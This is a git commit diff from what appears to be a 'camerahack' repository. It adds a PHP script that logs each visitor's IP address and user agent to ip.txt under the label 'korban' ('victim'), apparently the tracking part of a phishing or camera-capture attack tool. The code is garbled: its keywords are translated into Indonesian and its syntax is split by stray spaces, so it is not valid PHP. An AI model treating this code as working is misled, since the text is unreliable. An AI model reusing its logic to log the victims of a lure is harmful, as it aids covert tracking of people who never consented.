e702cd75496346b7e2e4224bcb2d4ef0fc12aa25
samgans04 <71473371+samgans04@users.noreply.github.com>
2020-09-18 08:39:09 +0700

    Update ip.php

--- ip.php
+++ ip.php
@@ -1,1 +1,29 @@
-# camerahack
+<? php
+
+jika (! kosong ( $ _SERVER [ 'HTTP_CLIENT_IP' ]))
+    {
+      $ ipaddress = $ _SERVER [ 'HTTP_CLIENT_IP' ]. "\ r \ n" ;
+    }
+elseif (! kosong ( $ _SERVER [ 'HTTP_X_FORWARDED_FOR' ]))
+    {
+      $ ipaddress = $ _SERVER [ 'HTTP_X_FORWARDED_FOR' ]. "\ r \ n" ;
+    }
+lain
+    {
+      $ ipaddress = $ _SERVER [ 'REMOTE_ADDR' ]. "\ r \ n" ;
+    }
+$ useragent = "Agen-Pengguna:" ;
+$ browser = $ _SERVER [ 'HTTP_USER_AGENT' ];
+
+
+$ file = 'ip.txt' ;
+$ korban = "IP:" ;
+$ fp = fopen ( $ file , 'a' );
+
+fwrite ( $ fp , $ korban );
+fwrite ( $ fp , $ ipaddress );
+fwrite ( $ fp , $ useragent );
+fwrite ( $ fp , $ browser );
+
+
+fclose ( $ fp );
